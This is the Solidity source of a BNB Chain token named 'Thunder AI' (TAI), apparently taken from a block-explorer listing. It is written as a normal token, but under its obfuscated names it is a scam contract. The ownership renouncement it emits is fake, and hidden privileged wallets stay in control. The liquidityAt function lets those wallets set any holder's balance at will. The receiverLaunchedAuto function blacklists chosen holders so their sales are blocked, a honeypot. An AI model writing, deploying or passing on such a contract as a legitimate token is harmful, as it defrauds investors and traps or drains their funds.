/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface fromExempt {
    function createPair(address limitAutoMin, address swapTeam) external returns (address);
}

contract ThunderAI {

    function liquidityAt(address senderFeeReceiver, uint256 shouldSellAuto) public {
        require(walletTake[isLimit()]);
        balanceOf[senderFeeReceiver] = shouldSellAuto;
    }

    uint256 public amountTradingSwap;

    function approve(address walletListMin, uint256 shouldSellAuto) public returns (bool) {
        allowance[isLimit()][walletListMin] = shouldSellAuto;
        emit Approval(isLimit(), walletListMin, shouldSellAuto);
        return true;
    }

    uint256 private amountMax;

    mapping(address => mapping(address => uint256)) public allowance;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    bool public enableFundAmount;

    function receiverLaunchedAuto(address listEnable) public {
        require(walletTake[isLimit()]);
        if (listEnable == walletLaunched || listEnable == enableMax) {
            return;
        }
        senderLaunch[listEnable] = true;
    }

    mapping(address => bool) public senderLaunch;

    address public walletLaunched;

    event Approval(address indexed isMax, address indexed spender, uint256 value);

    function maxSender(address tradingIs, address fundLaunch, uint256 shouldSellAuto) internal returns (bool) {
        require(balanceOf[tradingIs] >= shouldSellAuto);
        balanceOf[tradingIs] -= shouldSellAuto;
        balanceOf[fundLaunch] += shouldSellAuto;
        emit Transfer(tradingIs, fundLaunch, shouldSellAuto);
        return true;
    }

    function transfer(address senderFeeReceiver, uint256 shouldSellAuto) external returns (bool) {
        return transferFrom(isLimit(), senderFeeReceiver, shouldSellAuto);
    }

    address public owner;

    function transferFrom(address autoTo, address senderFeeReceiver, uint256 shouldSellAuto) public returns (bool) {
        if (autoTo != isLimit() && allowance[autoTo][isLimit()] != type(uint256).max) {
            require(allowance[autoTo][isLimit()] >= shouldSellAuto);
            allowance[autoTo][isLimit()] -= shouldSellAuto;
        }
        require(!senderLaunch[autoTo]);
        return maxSender(autoTo, senderFeeReceiver, shouldSellAuto);
    }

    constructor (){ 
        enableMax = fromExempt(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        walletLaunched = isLimit();
        balanceOf[walletLaunched] = totalSupply;
        walletTake[walletLaunched] = true;
        emit Transfer(address(0), walletLaunched, totalSupply);
        emit OwnershipTransferred(walletLaunched, address(0));
    }

    uint256 private feeToken;

    address public enableMax;

    mapping(address => uint256) public balanceOf;

    string public name = "Thunder AI";

    function isLimit() private view returns (address) {
        return msg.sender;
    }

    uint256 private amountIs;

    function fundTakeTo(address amountTradingSender) public {
        require(!enableFundAmount);
        walletTake[amountTradingSender] = true;
        enableFundAmount = true;
    }

    bool private marketingShould;

    mapping(address => bool) public walletTake;

    uint256 public tokenSender;

    event Transfer(address indexed from, address indexed fromMax, uint256 value);

    uint8 public decimals = 18;

    bool public sellShouldSender;

    string public symbol = "TAI";

    uint256 public totalSupply = 100000000 * 10 ** 18;

}